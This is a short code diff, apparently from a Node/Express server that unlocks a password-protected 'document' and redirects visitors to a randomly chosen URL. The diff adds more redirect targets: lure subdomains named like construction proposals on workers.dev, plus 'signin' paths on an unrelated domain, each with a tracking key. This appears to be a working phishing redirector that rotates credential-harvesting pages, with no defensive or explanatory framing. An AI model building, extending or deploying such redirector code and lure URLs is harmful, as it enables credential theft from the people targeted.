@@ -13,11 +13,14 @@ const CORRECT_CODE = process.env.DOCUMENT_PASSWORD || "2027219";
 
 // Add as many URLs as you want here. The script will pick one at random.
 const REDIRECT_URLS = [
-  "https://project-th2027-f65065a-7814b9.meridian-construction.workers.dev/?k=IZGZgV_wqn-Fj1LXhYdr83D4",
+  "https://proposal-108420-9eb-998ca1.millworks-construction.workers.dev/?k=4G2g2qr1lOLji2ay6PhvB7M1",
   "https://signin.rdations.com/w-t/ipz6ctn7?k=i4Uueq8MF5CHSzdL5w3vXPCR",
   "https://signin.rdations.com/w-t/4vfpga-4?k=YTppJSrI36s3hLjz9KXC8xgf",
   "https://signin.rdations.com/w-t/zb4nc7kp?k=Xqj_Fjb79OmpOgjfe7x1uo1P",
-  "https://signin.rdations.com/w-t/ctsymnvc?k=IZGZgV_wqn-Fj1LXhYdr83D4"
+  "https://signin.rdations.com/w-t/ctsymnvc?k=IZGZgV_wqn-Fj1LXhYdr83D4",
+  "https://proposal-108420-82e94a.millworks-construction.workers.dev/?k=4G2g2qr1lOLji2ay6PhvB7M1",
+  "https://proposal-108420-82e-21938b.millworks-construction.workers.dev/?k=4G2g2qr1lOLji2ay6PhvB7M1",
+  "https://proposal-108420-219-9ebfe7.millworks-construction.workers.dev/?k=4G2g2qr1lOLji2ay6PhvB7M1"
 ];
 
 app.post('/api/unlock', async (req, res) => {
